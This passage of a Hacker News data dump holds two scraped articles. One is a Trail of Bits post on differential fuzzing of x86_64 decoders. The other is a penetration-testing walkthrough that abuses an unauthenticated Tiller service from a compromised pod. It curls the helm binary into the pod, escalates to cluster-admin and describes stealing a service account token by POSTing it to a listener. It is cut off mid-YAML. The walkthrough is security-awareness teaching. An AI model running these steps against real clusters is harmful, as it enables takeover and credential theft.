from continuing or leaving a manual analyst responsible for realigning the disassembler. Outright decoding failures can be used to prevent usage of a susceptible tool or platform entirely, or to smuggle malicious code past an analyst. Component discrepancies can be used to mislead an analysis or human analyst into incorrectly interpreting the programs behavior. Severe enough discrepancies could even be used to mask the recovered control flow graph! Mishegos discovers each of these discrepancy classes via its analysis tool and presents them with mishmat, a hacky HTML visualization. The analysis tool collects language-agnostic filters into passes (think LLVM), which can then order their internal filters either via a dependency graph or based on perceived performance requirements (i.e., largest filters first). Passes are defined in ./src/analysis/passes.yml, e.g.: # Find inputs that all workers agree are one size, but one or more # decodes differently. same-size-different-decodings: - filter-any-failure - filter-ndecoded-different - filter-same-effects - minimize-input - normalize Figure 9: An example of a Mishegos analysis pass comprised of several filters Individual filters are written as small scripts that take cohorts on stdin and conditionally emit them on stdout. For example, filter-ndecoded-different: require \"json\" STDERR.puts \"[+] pass: filter-ndecoded-different\" count = 0 STDIN.each_line do |line| result = JSON.parse line, symbolize_names: true outputs_ndecoded = result[:outputs].map { |o| o[:ndecoded] } if outputs_ndecoded.uniq.size > 1 count += 1 next end STDOUT.puts result.to_json end STDERR.puts \"[+] pass: filter-ndecoded-different done: #{count} filtered\" Figure 10: An example of a Mishegos analysis filter Filters can also modify individual results or entire cohorts. The minimize-input filter chops the instruction candidate down to the longest indicated ndecoded field, and the normalize filter removes extra whitespace in preparation for additional analysis of individual assemblies. Finally, passes can be run as a whole via the analysis command-line: Figure 11: An example analysis run. The analysis output can be visualized with mishmat, with an optional cap on the size of the HTML table: mishmat -l 10000 < /tmp/mishegos.sd > /tmp/mishegos.sd.html Ultimately, this yields fun results like the ones below (slightly reformatted for readability). Instruction candidates are on the left, individual decoder results are labeled by column. (bad) in libbfds column indicates a decoding failure. The (N/M) syntax represents the number of bytes decoded (N) and the total length of the assembled string (M): libbfd capstone zydis xed f3f326264e0f3806cc repz repz es es rex.WRX (bad) (8 / 29) phsubd mm1, mm4 (9 / 15) (0 / 0) (0 / 0) 26f366364f0f38c94035 es data16 ss rex.WRXB (bad) (8 / 27) sha1msg1 xmm8, xmmword ptr ss:[r8 + 0x35] (10 / 41) (0 / 0) (0 / 0) f366364f0f38c94035 data16 ss rex.WRXB (bad) (7 / 24) sha1msg1 xmm8, xmmword ptr ss:[r8 + 0x35] (9 / 41) (0 / 0) (0 / 0) 66364f0f38c94035 ss rex.WRXB (bad) (6 / 17) sha1msg1 xmm8, xmmword ptr ss:[r8 + 0x35] (8 / 41) (0 / 0) (0 / 0) Figure 12: Capstone thinking that nonsense decodes to valid SSE instructions. libbfd capstone zydis xed f36766360f921d32fa9c83 repz data16 setb BYTE PTR ss:[eip+0xffffffff839cfa32] # 0xffffffff839cfa3d (11 / 74) (0 / 0) setb byte ptr [eip-0x7c6305ce] (11 / 30) setb byte ptr ss:[0x00000000839CFA3D] (11 / 37) Figure 13: Capstone missing an instruction entirely. libbfd capstone zydis xed 3665f0f241687aa82c8d ss gs lock repnz rex.B push 0xffffffff8d2ca87a (10 / 46) push -0x72d35786 (10 / 16) (0 / 0) (0 / 0) 65f0f241687aa82c8d gs lock repnz rex.B push 0xffffffff8d2ca87a (9 / 43) push -0x72d35786 (9 / 16) (0 / 0) (0 / 0) f0f241687aa82c8d lock repnz rex.B push 0xffffffff8d2ca87a (8 / 40) push -0x72d35786 (8 / 16) (0 / 0) (0 / 0) Figure 14: Amusing signed representations. libbfd capstone zydis xed 3e26f0f2f1 ds es lock repnz icebp (5 / 22) int1 (5 / 4) (0 / 0) (0 / 0) Figure 15: Undocumented opcode discrepancies! libbfd capstone zydis xed f3430f38f890d20aec2c repz rex.XB (bad) (5 / 17) (0 / 0) enqcmds rdx, zmmword ptr [r8+0x2cec0ad2] (10 / 40) enqcmds rdx, zmmword ptr [r8+0x2CEC0AD2] (10 / 40) 2e363e65440f0dd8 cs ss ds gs rex.R prefetch (bad) (6 / 32) (0 / 0) nop eax, r11d (8 / 13) nop eax, r11d (8 / 13) f2f266260fbdee repnz data16 es (bad) (6 / 21) (0 / 0) bsr bp, si (7 / 10) bsr bp, si (7 / 10) Figure 16: XED and Zydis only. libbfd capstone zydis xed 64f064675c fs lock fs addr32 pop rsp (5 / 25) (0 / 0) (0 / 0) (0 / 0) 2e cs (1 / 2) (0 / 0) (0 / 0) (0 / 0) f06636f00f3802c7 lock ss lock phaddd xmm0,xmm7 (8 / 29) (0 / 0) (0 / 0) (0 / 0) f03e4efd lock ds rex.WRX std (4 / 19) (0 / 0) (0 / 0) (0 / 0) 36f03e4efd ss lock ds rex.WRX std (5 / 22) (0 / 0) (0 / 0) (0 / 0) Figure 17: And, of course, libbfd being utterly and repeatedly wrong. The results above were captured with revision 88878dc on the repository. You can reproduce them by running the fuzzer in manual mode: M=1 mishegos ./workers.spec <<< 36f03e4efd > /tmp/mishegos The big takeaways For reverse engineers and program analysts: x86_64 instruction decoding is hard. The collection of tools that you rely on to do it are not, in fact, reliable. It is possible (and even trivial), given Mishegoss output, to construct adversarial binaries that confuse your tools and waste your time. Weve reported some of these issues upstream, but make no mistake: Trusting your decoder to perfectly report the machine behavior of a byte sequence will burn you. Not everything is doom and gloom. If you need accurate instruction decoding (and you do!), you should use XED or Zydis. libopcodes is frequently close to Zydis and XED in terms of instruction support but consistently records false positives and decodes just prefixes as valid instructions. Capstone reports both false positives and false negatives with some regularity. udis86 (not shown above) behaves similarly to libopcodes and, given its spotty maintenance, should not be used. This post is one of many from our team on the vagaries of parsing. Watch this space for a post by Evan Sultanik on polyglots and schizophrenic parsing. ",
          "From the great article:<p>\"x86_64 is the 64-bit extension of a 32-bit extension of a 40-year-old 16-bit ISA designed to be source-compatible with a 50-year-old 8-bit ISA. In short, it’s a mess, with each generation adding and removing functionality, ...\"<p>Nice way of wording that! :)<p>It also explains the complexity of the following 10 pages of text.",
          ">... a 40-year-old 16-bit ISA designed to be source-compatible with a 50-year-old 8-bit ISA.<p>In fairness to the Intel of that era, they actually did a really good job with this. They gained basically zero warts from the 8080 assembler source compatibility. They mostly set out to make the best variable length 16 bit instruction set they could. They had significant competition at the time and they pretty much had to make the 8086 instruction set something very usable. The x86 instruction set horror mostly came after that."
        ],
        "story_type": ["Normal"],
        "url": "https://blog.trailofbits.com/2019/10/31/destroying-x86_64-instruction-decoders-with-differential-fuzzing/",
        "comments.comment_id": [21409059, 21410349],
        "comments.comment_author": ["stragies", "upofadown"],
        "comments.comment_descendants": [5, 3],
        "comments.comment_time": [
          "2019-10-31T14:18:33Z",
          "2019-10-31T16:14:20Z"
        ],
        "comments.comment_text": [
          "From the great article:<p>\"x86_64 is the 64-bit extension of a 32-bit extension of a 40-year-old 16-bit ISA designed to be source-compatible with a 50-year-old 8-bit ISA. In short, it’s a mess, with each generation adding and removing functionality, ...\"<p>Nice way of wording that! :)<p>It also explains the complexity of the following 10 pages of text.",
          ">... a 40-year-old 16-bit ISA designed to be source-compatible with a 50-year-old 8-bit ISA.<p>In fairness to the Intel of that era, they actually did a really good job with this. They gained basically zero warts from the 8080 assembler source compatibility. They mostly set out to make the best variable length 16 bit instruction set they could. They had significant competition at the time and they pretty much had to make the 8086 instruction set something very usable. The x86 instruction set horror mostly came after that."
        ],
        "id": "78b49713-b83f-4516-97ce-9034a36f0cae",
        "url_text": "TL;DR: x86_64 decoding is hard, and the number and variety of implementations available for it makes it uniquely suited to differential fuzzing. Were open sourcing mishegos, a differential fuzzer for instruction decoders. You can use it to discover discrepancies in your own decoders and analysis tools! Figure 1: Some of Mishegoss output, visualized. In the beginning, there was instruction decoding Decompilation and reverse engineering tools are massive, complicated beasts that deal with some of the hardest problems in binary analysis: variable type and layout recovery, control flow graph inference, and sound lifting to higher-order representations for both manual and automated inspection. At the heart of each of these tasks is accurate instruction decoding. Automated tools require faithful extraction of instruction semantics to automate their analyses, and reverse engineers expect accurate disassembly listings (or well-defined failure modes) when attempting manual comprehension. Instruction decoding is implicitly treated as a solved problem. Analysis platforms give analysts a false sense of confidence by encouraging them to treat disassembled output as ground truth, without regarding potential errors in the decoder or adversarial instruction sequences in the input. Mishegos challenges this assumption. (x86_64) Instruction decoding is hard Like, really hard: Unlike RISC ISAs such as ARM and MIPS, x86_64 has variable-length instructions, meaning that decoder implementations must incrementally parse the input to know how many bytes to fetch. An instruction can be anywhere between 1 byte (e.g., 0x90, nop) and 15 bytes long. Longer instructions may be semantically valid (i.e., they may describe valid combinations of prefixes, operations, and literals), but actual silicon implementations will only fetch and decode 15 bytes at most (see the Intel x64 Developers Manual, 2.3.11). x86_64 is the 64-bit extension of a 32-bit extension of a 40-year-old 16-bit ISA designed to be source-compatible with a 50-year-old 8-bit ISA. In short, its a mess, with each generation adding and removing functionality, reusing or overloading instructions and instruction prefixes, and introducing increasingly complicated switching mechanisms between supported modes and privilege boundaries. Many instruction sequences have overloaded interpretations or plausible disassemblies, depending on the active processors state or compatibility mode. Disassemblers are required to make educated guesses, even when given relatively precise information about the compilation target or the expected execution mode. The complexity of the x86_64 instruction format is especially apparent when visualized: Figure 2: Visualizing some of x86_64s complexity. Even the graphic above doesnt fully capture x86_64s nuancesit ignores the internal complexity of the ModR/M and scale-index-base (SIB) bytes, as well as the opcode extension bit and various escaping formats for extended opcodes (legacy escape prefixes, VEX escape, and XOP escape). All told, these complexities make x86_64 decoder implementations uniquely amenable to testing via differential fuzzingby hooking a mutation engine up to several different implementations at once and comparing each collection of outputs, we can quickly suss out bugs and missing functionality. Building a sliding mutation engine for x86_64 instructions Given this layout and our knowledge about minimum and maximum instruction lengths on x86_64, we can construct a mutation engine that probes large parts of the decoding pipeline with a sliding strategy: Generate an initial instruction candidate of up to 26 bytes, including structurally valid prefixes and groomed ModR/M and SIB fields. Extract each window of the candidate, where each window is up to 15 bytes beginning at index 0 and moving to the right. Once all windows are exhausted, generate a new instruction candidate and repeat. Why up to 26 bytes? See above! x86_64 decoders will only accept up to 15 bytes, but generating long, (potentially) semantically valid x86_64 instruction candidates that we slide through means we can test likely edge cases in decoding: Failing to handle multiple, duplicate instruction prefixes. Emitting nonsense prefixes or disassembly attributes (e.g., accepting and emitting a repeat prefix on a non-string operation, or the lock prefix on something that isnt atomizable). Failing to parse the ModR/M or SIB bytes correctly, causing incorrect opcode decoding or bad displacement/immediate scaling/indexing. so, a maximal instruction candidate, shown in purple (with dummy displacement and immediate values, shown in grey) like f0 f2 2e 67 46 0f 3a 7a 22 8e 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f Figure 3: A maximal instruction candidate. yields 12 window candidates for actual fuzzing. f0 f2 2e 67 46 0f 3a 7a 22 8e 00 01 02 03 04 f2 2e 67 46 0f 3a 7a 22 8e 00 01 02 03 04 05 2e 67 46 0f 3a 7a 22 8e 00 01 02 03 04 05 06 67 46 0f 3a 7a 22 8e 00 01 02 03 04 05 06 07 46 0f 3a 7a 22 8e 00 01 02 03 04 05 06 07 08 0f 3a 7a 22 8e 00 01 02 03 04 05 06 07 08 09 3a 7a 22 8e 00 01 02 03 04 05 06 07 08 09 0a 7a 22 8e 00 01 02 03 04 05 06 07 08 09 0a 0b 22 8e 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 8e 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f Figure 4: Extracted instruction candidates. Consequently, our mutation engine spends a lot of time trying out different sequences of prefixes and flags, and relatively little time interacting with the (mostly irrelevant) displacement and immediate fields. Mishegos takes the sliding approach above and integrates it into a pretty typical differential fuzzing scheme. Each fuzzing target is wrapped into a worker process with a well-defined ABI: worker_ctor and worker_dtor: Worker setup and teardown functions, respectively. try_decode: Called for each input sample, returns the decoders results along with some metadata (e.g., how many bytes of input were consumed, the status of the decoder). worker_name: A constant string used to uniquely identify the type of worker. The codebase currently implements five workers: CapstoneA popular disassembly framework originally based on the LLVM projects disassemblers. libbfd/libopcodesThe backing libraries used by the popular GNU binutils. udis86An older, potentially unmaintained decoder (last commit 2014). XEDIntels reference decoder. ZydisAnother popular open source disassembly library, with an emphasis on speed and feature-completeness. Because of the barebones ABI, Mishegos workers tend to be extremely simple. The worker for Capstone, for example, is just 32 lines: #include <capstone/capstone.h> #include \"../worker.h\" static csh cs_hnd; char *worker_name = \"capstone\"; void worker_ctor() { if (cs_open(CS_ARCH_X86, CS_MODE_64, &cs_hnd) != CS_ERR_OK) { errx(1, \"cs_open\"); } } void worker_dtor() { cs_close(&cs_hnd); } void try_decode(decode_result *result, uint8_t *raw_insn, uint8_t length) { cs_insn *insn; size_t count = cs_disasm(cs_hnd, raw_insn, length, 0, 1, &insn); if (count > 0) { result->status = S_SUCCESS; result->len = snprintf(result->result, MISHEGOS_DEC_MAXLEN, \"%s %s\\n\", insn[0].mnemonic, insn[0].op_str); result->ndecoded = insn[0].size; cs_free(insn, count); } else { result->status = S_FAILURE; } } Figure 5: Source for the Capstone worker. Behind the scenes, workers receive inputs and send outputs in parallel via slots, which are accessed through a shared memory region managed by the fuzzing engine. Input slots are polled via semaphores to ensure that each worker has retrieved a candidate for decoding; output slots are tagged with the workers name and instruction candidate to allow for later collection into cohorts. The result is a relatively fast differential engine that doesnt require each worker to complete a particular sample before continuing: Each worker can consume inputs at its own rate, with only the number of output slots and cohort collection limiting overall performance. The birds-eye view: Figure 6: Mishegoss architecture. Making sense of the noise Mishegos produces a lot of output: A single 60-second run on a not particularly fast Linux server (inside of Docker!) produces about 1 million cohorts, or 4 million bundled outputs (1 output per input per fuzzing worker with 4 workers configured): Figure 7: An example Mishegos run. Each output cohort is structured as a JSON blob, and looks something like this: { \"input\": \"3626f3f3fc0f587c22\", \"outputs\": [ { \"ndecoded\": 5, \"len\": 21, \"result\": \"ss es repz repz cld \\n\", \"workerno\": 0, \"status\": 1, \"status_name\": \"success\", \"worker_so\": \"./src/worker/bfd/bfd.so\" }, { \"ndecoded\": 5, \"len\": 5, \"result\": \"cld \\n\", \"workerno\": 1, \"status\": 1, \"status_name\": \"success\", \"worker_so\": \"./src/worker/capstone/capstone.so\" }, { \"ndecoded\": 5, \"len\": 4, \"result\": \"cld \", \"workerno\": 2, \"status\": 1, \"status_name\": \"success\", \"worker_so\": \"./src/worker/xed/xed.so\" }, { \"ndecoded\": 5, \"len\": 3, \"result\": \"cld\", \"workerno\": 3, \"status\": 1, \"status_name\": \"success\", \"worker_so\": \"./src/worker/zydis/zydis.so\" } ] } Figure 8: An example output cohort from Mishegos. In this case, all of the decoders agree: The first five bytes of the input decode to a valid cld instruction. libbfd is extra eager and reports the (nonsense) prefixes, while the others silently drop them as irrelevant. But consistent successes arent what were interested inwe want discrepancies, dammit! Discrepancies can occur along a few dimensions: One or more decoders disagree about how many bytes to consume during decoding, despite all reporting success. One or more decoders report failure (or success), in contrast to others. All decoders report success and consume the same number of input bytes, but one or more disagree about a significant component of the decoding (e.g., the actual opcode or immediate/displacement values). Each of these has adversarial applications: Decoding length discrepancies can cause a cascade of incorrect disassemblies, preventing an automated tool from continuing or leaving a manual analyst responsible for realigning the disassembler. Outright decoding failures can be used to prevent usage of a susceptible tool or platform entirely, or to smuggle malicious code past an analyst. Component discrepancies can be used to mislead an analysis or human analyst into incorrectly interpreting the programs behavior. Severe enough discrepancies could even be used to mask the recovered control flow graph! Mishegos discovers each of these discrepancy classes via its analysis tool and presents them with mishmat, a hacky HTML visualization. The analysis tool collects language-agnostic filters into passes (think LLVM), which can then order their internal filters either via a dependency graph or based on perceived performance requirements (i.e., largest filters first). Passes are defined in ./src/analysis/passes.yml, e.g.: # Find inputs that all workers agree are one size, but one or more # decodes differently. same-size-different-decodings: - filter-any-failure - filter-ndecoded-different - filter-same-effects - minimize-input - normalize Figure 9: An example of a Mishegos analysis pass comprised of several filters Individual filters are written as small scripts that take cohorts on stdin and conditionally emit them on stdout. For example, filter-ndecoded-different: require \"json\" STDERR.puts \"[+] pass: filter-ndecoded-different\" count = 0 STDIN.each_line do |line| result = JSON.parse line, symbolize_names: true outputs_ndecoded = result[:outputs].map { |o| o[:ndecoded] } if outputs_ndecoded.uniq.size > 1 count += 1 next end STDOUT.puts result.to_json end STDERR.puts \"[+] pass: filter-ndecoded-different done: #{count} filtered\" Figure 10: An example of a Mishegos analysis filter Filters can also modify individual results or entire cohorts. The minimize-input filter chops the instruction candidate down to the longest indicated ndecoded field, and the normalize filter removes extra whitespace in preparation for additional analysis of individual assemblies. Finally, passes can be run as a whole via the analysis command-line: Figure 11: An example analysis run. The analysis output can be visualized with mishmat, with an optional cap on the size of the HTML table: mishmat -l 10000 < /tmp/mishegos.sd > /tmp/mishegos.sd.html Ultimately, this yields fun results like the ones below (slightly reformatted for readability). Instruction candidates are on the left, individual decoder results are labeled by column. (bad) in libbfds column indicates a decoding failure. The (N/M) syntax represents the number of bytes decoded (N) and the total length of the assembled string (M): libbfd capstone zydis xed f3f326264e0f3806cc repz repz es es rex.WRX (bad) (8 / 29) phsubd mm1, mm4 (9 / 15) (0 / 0) (0 / 0) 26f366364f0f38c94035 es data16 ss rex.WRXB (bad) (8 / 27) sha1msg1 xmm8, xmmword ptr ss:[r8 + 0x35] (10 / 41) (0 / 0) (0 / 0) f366364f0f38c94035 data16 ss rex.WRXB (bad) (7 / 24) sha1msg1 xmm8, xmmword ptr ss:[r8 + 0x35] (9 / 41) (0 / 0) (0 / 0) 66364f0f38c94035 ss rex.WRXB (bad) (6 / 17) sha1msg1 xmm8, xmmword ptr ss:[r8 + 0x35] (8 / 41) (0 / 0) (0 / 0) Figure 12: Capstone thinking that nonsense decodes to valid SSE instructions. libbfd capstone zydis xed f36766360f921d32fa9c83 repz data16 setb BYTE PTR ss:[eip+0xffffffff839cfa32] # 0xffffffff839cfa3d (11 / 74) (0 / 0) setb byte ptr [eip-0x7c6305ce] (11 / 30) setb byte ptr ss:[0x00000000839CFA3D] (11 / 37) Figure 13: Capstone missing an instruction entirely. libbfd capstone zydis xed 3665f0f241687aa82c8d ss gs lock repnz rex.B push 0xffffffff8d2ca87a (10 / 46) push -0x72d35786 (10 / 16) (0 / 0) (0 / 0) 65f0f241687aa82c8d gs lock repnz rex.B push 0xffffffff8d2ca87a (9 / 43) push -0x72d35786 (9 / 16) (0 / 0) (0 / 0) f0f241687aa82c8d lock repnz rex.B push 0xffffffff8d2ca87a (8 / 40) push -0x72d35786 (8 / 16) (0 / 0) (0 / 0) Figure 14: Amusing signed representations. libbfd capstone zydis xed 3e26f0f2f1 ds es lock repnz icebp (5 / 22) int1 (5 / 4) (0 / 0) (0 / 0) Figure 15: Undocumented opcode discrepancies! libbfd capstone zydis xed f3430f38f890d20aec2c repz rex.XB (bad) (5 / 17) (0 / 0) enqcmds rdx, zmmword ptr [r8+0x2cec0ad2] (10 / 40) enqcmds rdx, zmmword ptr [r8+0x2CEC0AD2] (10 / 40) 2e363e65440f0dd8 cs ss ds gs rex.R prefetch (bad) (6 / 32) (0 / 0) nop eax, r11d (8 / 13) nop eax, r11d (8 / 13) f2f266260fbdee repnz data16 es (bad) (6 / 21) (0 / 0) bsr bp, si (7 / 10) bsr bp, si (7 / 10) Figure 16: XED and Zydis only. libbfd capstone zydis xed 64f064675c fs lock fs addr32 pop rsp (5 / 25) (0 / 0) (0 / 0) (0 / 0) 2e cs (1 / 2) (0 / 0) (0 / 0) (0 / 0) f06636f00f3802c7 lock ss lock phaddd xmm0,xmm7 (8 / 29) (0 / 0) (0 / 0) (0 / 0) f03e4efd lock ds rex.WRX std (4 / 19) (0 / 0) (0 / 0) (0 / 0) 36f03e4efd ss lock ds rex.WRX std (5 / 22) (0 / 0) (0 / 0) (0 / 0) Figure 17: And, of course, libbfd being utterly and repeatedly wrong. The results above were captured with revision 88878dc on the repository. You can reproduce them by running the fuzzer in manual mode: M=1 mishegos ./workers.spec <<< 36f03e4efd > /tmp/mishegos The big takeaways For reverse engineers and program analysts: x86_64 instruction decoding is hard. The collection of tools that you rely on to do it are not, in fact, reliable. It is possible (and even trivial), given Mishegoss output, to construct adversarial binaries that confuse your tools and waste your time. Weve reported some of these issues upstream, but make no mistake: Trusting your decoder to perfectly report the machine behavior of a byte sequence will burn you. Not everything is doom and gloom. If you need accurate instruction decoding (and you do!), you should use XED or Zydis. libopcodes is frequently close to Zydis and XED in terms of instruction support but consistently records false positives and decodes just prefixes as valid instructions. Capstone reports both false positives and false negatives with some regularity. udis86 (not shown above) behaves similarly to libopcodes and, given its spotty maintenance, should not be used. This post is one of many from our team on the vagaries of parsing. Watch this space for a post by Evan Sultanik on polyglots and schizophrenic parsing. ",
        "_version_": 1718527433632645120
      },
      {
        "story_id": [21060714],
        "story_author": ["alexellisuk"],
        "story_descendants": [11],
        "story_score": [14],
        "story_time": ["2019-09-24T14:43:43Z"],
        "story_title": "Attacking Default Installs of Helm on Kubernetes",
        "search": [
          "Attacking Default Installs of Helm on Kubernetes",
          "https://blog.ropnop.com/attacking-default-installs-of-helm-on-kubernetes/",
          "Intro I have totally fallen down the Kubernetes rabbit hole and am really enjoying playing with it and attacking it. One thing Ive noticed is although there are a lot of great resources to get up and running with it really quickly, there are far fewer that take the time to make sure its set up securely. And a lot of these tutorials and quick-start guides leave out important security options for the sake of simplicity. In my opinion, one of the biggest offenders of this is Helm, the package manager for Kubernetes. There are countless tutorials and Stack Overflow answers that completely gloss over the security recommendations and take steps that really put the entire cluster at risk. More and more organizations Ive talked to recently actually seem to be ditching the cluster side install of Helm (Tiller) entirely for security reasons, and I wanted to explore and explain why. In this post, Ill set up a default GKE cluster with Helm and Tiller, then walk through how an attacker who compromises a running pod could abuse the lack of security controls to completely take over the cluster and become full admin. tl;dr The simple way to install Helm requires cluster-admin privileges to be given to its pod, and then exposes a gRPC interface inside the cluster without any authentication. This endpoint allows any compromised pod to deploy arbitrary Kubernetes resources and escalate to full admin. I wrote a few Helm charts that can take advantage of this here: https://github.com/ropnop/pentest_charts Disclaimer This post in only meant to practically demonstrate the risks involved in not enabling the security features for Helm. These are not vulnerabilities in Helm or Tiller and Im not disclosing anything previously unknown. My only hope is that by laying out practical attacks, people will think twice about configuring loose RBAC policies and not enabling mTLS for Tiller. Installing the Environment To demonstrate the attack, Im going to set up a typical web stack on Kubernetes using Google Kubernetes Engine (GKE) and Helm. Ill be installing everything using just the defaults as found on many write-ups on the internet. If you want to just get to the attacking part, feel free to skip this section and go directly to Exploiting a Running Pod Set up GKE Ive createad a new GCP project and will be using the command line tool to spin up a new GKE cluster and gain access to it: 1 2 3 4 5 $ gcloud projects create ropnop-helm-testing #create a new project $ gcloud config set project ropnop-helm-testing #use the new project $ gcloud config set compute/region us-central1 $ gcloud config set compute/zone us-central1-c $ gcloud services enable container.googleapis.com #enable Kubernetes APIs Now Im ready to create the cluster and get credentials for it. I will do it with all the default options. There are a lot of command line switches that can help lock down this cluster, but Im not going to provide any: 1 $ gcloud container clusters create ropnop-k8s-cluster After a few minutes, my cluster is up and running: Lastly, I get credentials and verify connectivity with kubectl: 1 2 $ gcloud container clusters get-credentials ropnop-k8s-cluster #set up kubeconfig $ kubectl config get-clusters And everything looks good, time to install Helm and Tiller Installing Helm+Tiller Helm has a quickstart guide to getting up and running with Helm quickly. This guide does mention that the default installation is not secure and should only be used for non-production or internal clusters. However, several other guides on the internet skip over this fact (example1, example2). And several Stack Overflow answers Ive seen just have copy/paste code to install Tiller with no mention of security. Again, Ill be doing a default installation of Helm and Tiller, using the easiest method. Creating the service account Since Role Based Access Control (RBAC) is enabled by default now on every Kubernetes provider, the original way of using Helm and Tiller doesnt work. The Tiller pod needs elevated permissions to talk the Kubernetes API. Fine grain controlling of service account permissions is tricky and often overlooked, so the easiest way to get up and running is to create a service account for Tiller with full cluster admin privileges. To create a service account with cluster admin privs, I define a new ServiceAccount and ClusterRoleBinding in YAML: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 apiVersion: v1 kind: ServiceAccount metadata: name: tiller namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: tiller roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin subjects: - kind: ServiceAccount name: tiller namespace: kube-system and apply it with kubectl: 1 $ kubectl apply -f tiller-rbac.yaml This created a service account called tiller, generated a secret auth token for it, and gave the account full cluster admin privileges. Initialize Helm The final step is to initialize Helm with the new service account. Again, there are additional flags that can be provided to this command that will help lock it down, but Im just going with the defaults: 1 $ helm init --service-account tiller Besides setting up our client, this command also creates a deployment and service in the kube-system namespace for Tiller. The resources are tagged with the label app=helm, so you can filter and see everything running: We can also see that the Tiller deployment is configured to use our cluster admin service account: 1 2 $ kubectl -n kube-system get deployments -l 'app=helm' -o jsonpath='{.items[0].spec.template.spec.serviceAccount}' tiller Installing Wordpress Now its time to use Helm to install something. For this scenario, Ill be installing a Wordpress stack from the official Helm repository. This is a pretty good example of how quick and powerful Helm can be. In one command we can get a full stack deployment of Wordpress including a persistent MySQL backend. 1 $ helm install stable/wordpress --name mycoolblog With no other flags, Tiller deploys all the resources into the default namespace. The name field gets applied as a release label on the resource, so we can view all the resources that were created: Helm took care of exposing the port for us too via a LoadBalancer service, so if we visit the external IP listed, we can see that Wordpress is indeed up and running: And thats it! Ive got my blog up and running on Kubernetes in no time. What could go wrong now? Exploiting a Running Pod From here on out, I am going to assume that my Wordpress site has been totally compromised and an attacker has gained remote code execution on the underlying pod. This could be through a vulnerable plugin I installed or a bad misconfiguration, but lets just assume an attacker got a shell. Note: for purposes of this scenario Im just giving myself a shell on the pod directly with the following command 1 $ kubectl exec -it mycoolblog-wordpress-5d6c7d5464-hl972 -- /bin/bash Post Exploitation After landing a shell, theres a few indicators that quickly point to this being a container running on Kubernetes: The file /.dockerenv exists - were inside a Docker container Various kubernetes environment variables Theres several good resources out there for various Kubernetes post-exploitation activities. I recommend carnal0wnages Kubernetes master post for a great round-up. Trying some of these techniques, though, well discover that the default GKE install is still fairly locked down (and updated against recent CVEs). Even though we can talk to the Kubernetes API, for example, RBAC is enabled and we cant get anything from it: Time for some more reconaissance Service Reconaissance By default, Kubernetes makes service discovery within a cluster easy through kube-dns. Looking at /etc/resolv.conf we can see that this pod is configured to use kube-dns: 1 2 3 nameserver 10.7.240.10 search default.svc.cluster.local svc.cluster.local cluster.local us-central1-c.c.ropnop-helm-testing.internal c.ropnop-helm-testing.internal google.internal options ndots:5 Our search domains tell us were in the default namespace (as well as inside a GKE project named ropnop-helm-testing). DNS names in kube-dns follow the format: <svc_name>.<namespace>.svc.cluster.local. Through DNS, for example, we can look up our MariaDB service that Helm created: 1 2 $ getent hosts mycoolblog-mariadb 10.7.242.104 mycoolblog-mariadb.default.svc.cluster.local (Note: Im using getent since this pod didnt have standard DNS tools installed - living off the land ftw :) ) Even though were in the default namespace, its important to remember that namespaces dont provide any security. By default, there are no network policies that prevent cross-namespace communication. From this position, we can query services that are running in the kube-system namespace. For example, the kube-dns service itself: 1 2 $ getent hosts kube-dns.kube-system.svc.cluster.local 10.7.240.10 kube-dns.kube-system.svc.cluster.local Through DNS, its possible to enumerate running services in other namespaces. Remember how Tiller created a service in kube-system? Its default name is tiller-deploy. If we checked for that via a DNS lookup wed see it exists and exactly where its at: Great! Tiller is installed in this cluster. How can we abuse it? Abusing tiller-deploy The way that Helm talks with a kubernetes cluster is over gRPC to the tiller-deploy pod. The pod then talks to the Kubernetes API with its service account token. When a helm command is run from a client, under the hood a port forward is opened up into the cluster to talk directly to the tiller-deploy service, which always points to the tiller-deploy pod on TCP 44134. What this means is that for a user outside the cluster, they must have the ability to open port forwards into the cluster since port 44134 is not externally exposed. However, from inside the cluster, 44134 is available and the port forward is not needed. We can verify that the port is open by simply tryint to curl it: Since we didnt get a timeout, something is listening there. Curl fails though, since this endpoint is designed to talk gRPC, not HTTP. Knowing we can reach the port, if we can send the right messages, we can talk directly to Tiller - since by default, Tiller does not require any authentication for gRPC communication. And since in this default install Tiller is running with cluster-admin privileges, we can essentially run cluster admin commands without any authentication. Talking gRPC to Tiller All of the gRPC endpoints are defined in the source code in Protobuf format, so anyone can create a client to communicate to the API. But the easiest way to communicate with Tiller is just through the normal Helm client, which is a static binary anyway. On our compromised pod, we can download the helm binary from the official releases. To download and extract to /tmp: 1 2 export HVER=v2.11.0 #you may need different version curl -L \"https://storage.googleapis.com/kubernetes-helm/helm-${HVER}-linux-amd64.tar.gz\" | tar xz --strip-components=1 -C /tmp linux-amd64/helm Note: You may need to download specific versions to match up the version running in the server. Youll see error messages telling you what version to get. The helm binary allows us to specify a direct address to Tiller with --host or with the HELM_HOST environment variable. By plugging in the discovered tiller-deploy services FQDN, we can directly communicate with the Tiller pod and run arbitrary Helm commands. For example, we can see our previously installed Wordpress release! From here, we have full control of Tiller. We can do anything a cluster admin could normally do with Helm, including installing/upgrading/deleting releases. But we still cant directly talk to the Kubernetes API, so lets abuse Tiller to upgrade our privileges and become full cluster admin. Stealing secrets with Helm and Tiller Tiller is configured with a service account that has cluster admin privileges. This means that the pod is using a secret, privileged service token to authenticate with the Kubernetes API. Service accounts are generally only used for non-human interactions with the k8s API, however anyone in possession of the secret token can still use it. If an attacker compromises Tillers service account token, he or she can execute any Kubernetes API call with full admin privileges. Unfortunately, the Helm API doesnt support direct querying of secrets or other resources. Using Helm, we can only create new releases from chart templates. Chart templates are very well documented and allow us to template out custom resources to deploy to Kubernetes. So we just need to craft a resource in a way to exfiltrate the secret(s) we want. Stealing a service account token When the service account name is known, stealing its token is fairly straightforward. All that is needed is to launch a pod with that service account, then read the value from /var/run/secrets/kubernetes.io/serviceaccount/token, where the token value gets mounted at creation. Its possible to just define a job to read the value and use curl to POST it to a listening URL: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: batch/v1 